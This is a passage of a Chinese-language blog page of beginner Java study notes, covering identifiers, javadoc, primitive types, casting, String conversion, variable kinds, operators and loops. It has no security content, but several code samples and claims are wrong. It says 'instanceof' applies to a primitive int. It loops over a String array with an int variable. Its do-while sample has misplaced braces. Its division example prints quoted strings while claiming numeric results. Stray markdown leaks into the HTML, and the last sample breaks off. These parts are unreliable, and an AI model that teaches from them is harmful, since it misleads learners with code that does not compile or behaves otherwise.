title="初学Java易犯错误"></a>初学Java易犯错误</h2><ol><li>  找不到文件：文件名字写错了，或者<strong>终端的</strong>当前位置不对</li><li>  主类名和文件名不一致</li><li>  缺少分号</li></ol><h2 id="Java基本概念（第一个Java程序）"><a href="#Java基本概念（第一个Java程序）" class="headerlink" title="Java基本概念（第一个Java程序）"></a>Java基本概念（第一个Java程序）</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ol><li>  对象：对象是类的一个实例，有状态和行为。例如，一条狗是一个对象，它的状态有：颜色、名字、品种；行为有：摇尾巴、叫、吃等。</li><li>  类：类是一个模板，描述一类对象的行为和状态</li><li>  方法：方法就是行为，一个类可以有很多方法。逻辑运算，数据修改以及所有动作都是在方法中完成的。</li><li>  实例变量：每个对象都有独特的实例变量，对象的状态由这些实例变量的值决定。</li></ol><h3 id="第一个Java程序"><a href="#第一个Java程序" class="headerlink" title="第一个Java程序"></a>第一个Java程序</h3><p><img src="https://www.runoob.com/wp-content/uploads/2013/12/662E827A-FA32-4464-B0BD-40087F429E98.jpg"></p><ol><li>  public class Demo03Helloworld：定义一个类</li><li>  class：代表的就是类，类是Java程序最基本的组成单元，所有代码都需要在class中写</li><li>  class后面跟的名字叫做类名，要求类名和Java文件名保持一致</li><li>  public static void main(String[] args)：叫做main方法，是程序的入口，jvm执行代码，会从main开始执行</li><li>  System和String的首字母S要大写</li><li></li></ol><h2 id="养成习惯"><a href="#养成习惯" class="headerlink" title="养成习惯"></a>养成习惯</h2><ol><li>  大小写敏感：Java是大小写敏感的</li><li>  类名:对于所有类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母都应该大写，My First Java Class</li><li>  方法名:所有的方法名都应该以小写字母开头，如果方法名含有若干单词，则后面的每个单词首字母大写（只是第一个单词小写，后面的每一个单词的首字母都要大写）</li><li>  源文件名：源文件名必须和类名相同，当保存文件时，应该使用类名作为文件名保存</li><li>  主方法入口：所有的Java程序都是由public static void main(String[] args)方法开始执行</li></ol><h3 id="Java标识符"><a href="#Java标识符" class="headerlink" title="Java标识符"></a>Java标识符</h3><ol><li><p>  类名，变量名，方法名都被称作标识符</p></li><li><p>所有标识符都应以字母，美元符，或者下划线作为首字母，不能用数字作为标识符的首字母</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span>a<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">A</span><span class="token operator">-</span><span class="token class-name">Z</span><span class="token punctuation">]</span> $ _<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  首字母之后可以是字母，美元符，下划线和数字的任何字符组合</p></li><li><p>  关键字不能用作标识符</p></li><li><p>  大小写敏感</p></li></ol><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220809164325.png"></p><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220809164406.png"></p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><ol><li>  单行注释 //</li><li>  多行注释 /* */,<strong>多行注释里面不允许由多行注释嵌套</strong></li><li>  文档注释/** */,第二个星号和第三个星号之间写注释内容</li></ol><h3 id="文档注释"><a href="#文档注释" class="headerlink" title="文档注释"></a>文档注释</h3><ol><li><p>  注释内容可以被JDK提供的工具javadoc所解析，生成一套以网页文件型式体现的该程序的说明文档，一般写在类</p></li><li><p>  可以使用javadoc工具来生成信息，并且输出到HTML文件中。</p></li><li><p>常用的标签</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@author</span> <span class="token annotation punctuation">@exception</span> <span class="token annotation punctuation">@link</span> <span class="token annotation punctuation">@return</span> <span class="token annotation punctuation">@see</span> <span class="token annotation punctuation">@serial</span> <span class="token annotation punctuation">@version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  javadoc标签<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220809214913.png"></p></li><li><p>  由  /** 开始 由 */结束，在开始的/**之后，第一行或几行是关于类，变量，和方法的主要描述，可以不加@标签写非标签的注释</p></li><li><p>之后可以包含一个或多个各式各样的**@标签**，每一个@标签必须在一个新行的开始或者在一行的开始紧跟星号 *</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/***这是一个javadoc* @author runoob* @version 1.2*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  javadoc的输出：javadoc将你的Java程序的源代码作为输入，输出一些包含你程序注释的HTML文件</p></li><li><p>  每一个类的信息将在独自的HTML文件里，javadoc也可以输出继承的树形结构和索引</p></li><li><p>  由于javadoc的实现不同，工作也可能不同</p></li><li><p>  每一个javadoc<strong>文档注释都在描述的项目的前面</strong></p></li><li><p>  可以在<strong>每一个class中都写一个javadoc</strong></p></li><li><p>  结果将在 <strong>class名字.html</strong> 中找到</p></li></ol><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><h3 id="两大数据类型"><a href="#两大数据类型" class="headerlink" title="两大数据类型"></a>两大数据类型</h3><ol><li>  内置数据类型</li><li>  引用数据类型</li></ol><h3 id="内置数据类型"><a href="#内置数据类型" class="headerlink" title="内置数据类型"></a>内置数据类型</h3><ol><li>  8种基本类型：6种数字类型，1种字符类型，1种bool类型</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span> <span class="token number">8</span>位，有符号的，以二进制补码表示的整数<span class="token keyword">short</span> <span class="token number">16</span>位<span class="token keyword">int</span> <span class="token number">32</span>位<span class="token keyword">long</span> <span class="token number">64</span>位<span class="token keyword">float</span> <span class="token number">32</span><span class="token keyword">double</span> <span class="token number">64</span><span class="token keyword">boolean</span> 只有两个取值，<span class="token boolean">true</span>和<span class="token boolean">false</span>，表示一位的信息，默认值为<span class="token boolean">false</span><span class="token keyword">char</span> <span class="token number">16</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3><ol><li>  在Java中，引用类型的变量非常类似于C/C++的指针。</li><li>  引用类型指向一个对象，<strong>指向对象的变量</strong>是引用变量。</li><li>  这些变量在声明时被指定为一个特定的类型，比如 Employee、Puppy 等。变量一旦声明后，类型就不能被改变了。</li><li>  简单地说，就是自己写的对象和数组就是引用数据类型</li><li>  所有引用类型的默认值都为null</li></ol><h3 id="java常量"><a href="#java常量" class="headerlink" title="java常量"></a>java常量</h3><ol><li><p>在Java中使用final关键字来修饰常量，声明方式就是在变量声明方式前面加上final</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">double</span> PI <span class="token operator">=</span> <span class="token number">3.14</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  用0来表示8进制，0x表示16进制，不能是o和O</p></li><li><p>  字符串常量和字符变量都可以包含任何 Unicode 字符。</p></li></ol><h3 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h3><ol><li><p>  整型，实型，字符型数据可以混合运算，运算中，不同类型的数据先转换为同一类型，然后进行运算</p></li><li><p>转换从低级到高级</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java">低  <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">></span>  高<span class="token keyword">byte</span><span class="token punctuation">,</span><span class="token keyword">short</span><span class="token punctuation">,</span><span class="token keyword">char</span>—<span class="token operator">></span> <span class="token keyword">int</span> —<span class="token operator">></span> <span class="token keyword">long</span>—<span class="token operator">></span> <span class="token keyword">float</span> —<span class="token operator">></span> <span class="token keyword">double</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="转换规则"><a href="#转换规则" class="headerlink" title="转换规则"></a>转换规则</h4><ol><li>  不能对bool类型进行转换</li><li>  不能把对象类型转换成不相关类的对象。？？？</li><li>  在把容量大的类型转换为容量小的类型时必须使用强制类型转换</li><li>  转换过程中可能出现溢出或者精度损失</li><li>  浮点数转换为整数时通过舍弃小数得到，而不是四舍五入</li><li>  该区域的数据/值可以在<strong>同一类型范围</strong>内不断变化</li></ol></li></ol><h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><ol><li><p>  条件是转换的数据类型必须是兼容的</p></li><li><p>格式</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">(</span>type<span class="token punctuation">)</span>value<span class="token keyword">int</span> i1 <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">byte</span> b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span>i1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="基本数据类型和String类型的转换"><a href="#基本数据类型和String类型的转换" class="headerlink" title="基本数据类型和String类型的转换"></a>基本数据类型和String类型的转换</h3><h4 id="基本数据类型转String类型"><a href="#基本数据类型转String类型" class="headerlink" title="基本数据类型转String类型"></a>基本数据类型转String类型</h4><ol><li><p>语法：将基本类型的值 + ”“ 即可</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StringToBasic</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> n1 <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> str1 <span class="token operator">=</span> n1 <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> str2 <span class="token operator">=</span> <span class="token string">"abc"</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str1 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> str2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  注意这个地方的String的首字母是大写的</p></li></ol><h4 id="String类型转基本数据类型"><a href="#String类型转基本数据类型" class="headerlink" title="String类型转基本数据类型"></a>String类型转基本数据类型</h4><ol><li><p>语法：通过基本类型的包装类调用parseXXX方法即可</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StringToBasic</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> s1 <span class="token operator">=</span> <span class="token string">"100"</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  parse:解析，parseInt:将字符串参数作为有符号的十进制整数进行解析，除了第一个字符可以是用来表示负值的ASCII减号外，其余的字符串中的字符都必须是十进制整数。</p></li><li><p>parseDouble:</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StringToBasic</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> s1 <span class="token operator">=</span> <span class="token string">"123.111"</span><span class="token punctuation">;</span>        <span class="token keyword">double</span> dou1 <span class="token operator">=</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dou1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  还有Float.parseFloat , Long.parseLong，Byte.parseByte等等</p></li></ol><h2 id="常量运算除法特殊"><a href="#常量运算除法特殊" class="headerlink" title="常量运算除法特殊"></a>常量运算除法特殊</h2><ol><li><p>  前后如果都是整数，结果只取整数部分</p></li><li><p>  前后只要有一个带小数点，结果就是正常小数了</p></li><li><p>```java<br>   System.out.println(“10/3”) //结果为3，不为小数<br>   System.out.println(“10.0/3”) //结果为小数<br>   System.out.println(“10/3.0”) //结果为小数</p>   <pre class="line-numbers language-none"><code class="language-none">## 变量类型1.   使用逗号来隔开声明多个同类型变量，和c不同的是：可以在定义多个变量的同时，写到一行，统一赋值     &#96;&#96;&#96;java     int a, b, c;         &#x2F;&#x2F; 声明三个int型整数：a、 b、c     int d &#x3D; 3, e &#x3D; 4, f &#x3D; 5; &#x2F;&#x2F; 声明三个整数并赋予初值     byte z &#x3D; 22;         &#x2F;&#x2F; 声明并初始化 z     String s &#x3D; &quot;runoob&quot;;  &#x2F;&#x2F; 声明并初始化字符串 s     double pi &#x3D; 3.14159; &#x2F;&#x2F; 声明了双精度浮点型变量 pi     char x &#x3D; &#39;x&#39;;        &#x2F;&#x2F; 声明变量 x 的值是字符 &#39;x&#39;。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="java支持的变量类型"><a href="#java支持的变量类型" class="headerlink" title="java支持的变量类型"></a>java支持的变量类型</h3><ol><li><p>  类变量：独立于方法之外的变量，用static修饰</p></li><li><p>  实例变量：独立于方法之外的变量，不过没有static修饰</p></li><li><p>局部变量：类的方法中的变量</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Variable</span><span class="token punctuation">&#123;</span><span class="token keyword">static</span> <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//类变量</span><span class="token class-name">String</span> str<span class="token operator">=</span><span class="token string">"hello world"</span><span class="token punctuation">;</span> <span class="token comment">//实例变量</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">//局部变量</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><ol><li>  局部变量在方法，构造方法，或者语句块被执行的时候创建，当他们执行完后，变量会自动销毁</li><li>  访问修饰符不能用于局部变量 ？？？</li><li>  局部变量只在声明它的方法、构造方法或者语句块中可见</li><li>  局部变量没有默认值，所以局部变量被声明后，必须经过初始化，才能使用</li></ol><h3 id="实例变量"><a href="#实例变量" class="headerlink" title="实例变量"></a>实例变量</h3><ol><li>  实例变量声明在一个类中，但在方法、构造方法和语句块之外</li><li>  当一个对象被实例化之后，每个实例对象的值就跟着确定</li><li>  实例对象的在对象创建的时候创建，在对象销毁的时候销毁</li><li>  实例对象的值至少应该被一个方法，构造方法或者语句块引用，使得外部能够通过这些方式获取实例变量信息</li><li>  实例对象可以声明在使用前和使用后</li></ol><h3 id="类变量，静态变量"><a href="#类变量，静态变量" class="headerlink" title="类变量，静态变量"></a>类变量，静态变量</h3><ol><li>  类变量也称为静态变量，在类中以 static 关键字声明，但必须在方法之外。</li><li>  无论一个类创建了多少个对象，类只拥有类变量的一份拷贝。</li><li>  静态变量除了被声明为常量外很少使用，静态变量是指声明为 public/private，final 和 static 类型的变量。静态变量初始化后不可改变。</li></ol><h3 id="常量和静态变量的区别"><a href="#常量和静态变量的区别" class="headerlink" title="常量和静态变量的区别"></a>常量和静态变量的区别</h3><ol><li>  常量前面用final修饰，静态变量前面用static修饰</li></ol><p><a href="https://blog.csdn.net/haobaworenle/article/details/65944171">(94条消息) 静态变量和常量的区别_haobaworenle的博客-CSDN博客_静态变量和常量有什么区别</a></p><h3 id="静态变量和实例变量的区别"><a href="#静态变量和实例变量的区别" class="headerlink" title="静态变量和实例变量的区别"></a>静态变量和实例变量的区别</h3><ol><li><p>  语法上：静态变量前面用static关键字，实例变量前面不用</p></li><li><p>  实例变量属于某个实例对象，只有当实例化后才能创建实例变量</p></li><li><p>而静态变量不属于实例对象，而是属于类，只要程序加载了类的字节码，不用创建实例对象，就会被分配空间，静态变量就能使用</p><p>  <a href="https://blog.csdn.net/hjq_ku/article/details/122452611">(94条消息) 静态变量和实例变量的区别_韩金群的博客-CSDN博客_静态变量和实例变量的区别</a></p></li></ol><h2 id="Java修饰符"><a href="#Java修饰符" class="headerlink" title="Java修饰符"></a>Java修饰符</h2><ol><li>  修饰符用来定义类、方法或者变量，通常放在语句的最前端。</li></ol><h3 id="访问修饰符"><a href="#访问修饰符" class="headerlink" title="访问修饰符"></a>访问修饰符</h3><ol><li><p>Java中，可以使用访问控制符来保护对类、变量、方法和构造方法的访问。</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220810115535.png"></p></li></ol><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">>>></span> 按位右移补零操作符。左操作数的值按右操作数指定的位数右移，移动得到的空位以<span class="token number">0</span>补充<span class="token operator">>></span> 按位右移操作符，移动得到的左边空位不会以<span class="token number">0</span>补充<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>  注意逻辑运算符 &amp;&amp; 和 || 带来的短路特性</li></ol><h3 id="instanceof-运算符"><a href="#instanceof-运算符" class="headerlink" title="instanceof 运算符"></a>instanceof 运算符</h3><ol><li><p>  该运算符用于操作对象实例，检查该对象是否是一个特定的类型。</p></li><li><p>例如，检查是否为int类型，就是 var instanceof int,返回值是一个bool值，true或false，所以可以判断对象的类型（类类型或接口类型）</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token string">"James"</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> result <span class="token operator">=</span> name <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">;</span> <span class="token comment">//由于name是String类型，所以返回值为true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>如果被比较的对象兼容右侧类型，该运算符仍然返回true,例如下面的例子，子类继承了父类，所以兼容于父类，所以子类instanceof父类</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Vehicle</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Car</span> <span class="token keyword">extends</span> <span class="token class-name">Vehicle</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">Vehicle</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Car</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> result <span class="token operator">=</span> a <span class="token keyword">instanceof</span> <span class="token class-name">Car</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><ol><li>  while</li><li>  do while</li><li>  for</li><li>  break</li><li>  continue</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">do</span><span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"value of x : "</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>x<span class="token operator">++</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"value of x :"</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//这个地方的 string + x 的用法和一个整数 + ""可以成为字符串一样</span>x<span class="token operator">++</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> numbers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">:</span> numbers<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">" , "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> names <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"james"</span><span class="token punctuation">,</span><span class="token string">"Larry"</span><span class="token punctuation">,</span><span class="token string">"TOM"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">:</span> names<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">" , "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>  上面for循环使用的是类似于c++的范围遍历的增强型for循环</p></li><li><p>  声明语句：声明新的局部变量，该变量的类型必须和数组元素的类型匹配，其作用域限定在循环语句块，其值与此时数组元素的值相等</p></li><li><p>表达式：表达式是要访问的数组名，或者是返回值为数组的方法</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span>声明语句 <span class="token operator">:</span> 表达式<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//代码语句；</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  break主要用于循环语句或者switch语句中，用来跳出整个语句块</p></li><li><p>break跳出最里层的循环，并且继续执行该循环下面的语句(<strong>执行该层循环之外的其它语句，跳出此循环</strong>)</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> numbers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">:</span> numbers<span class="token 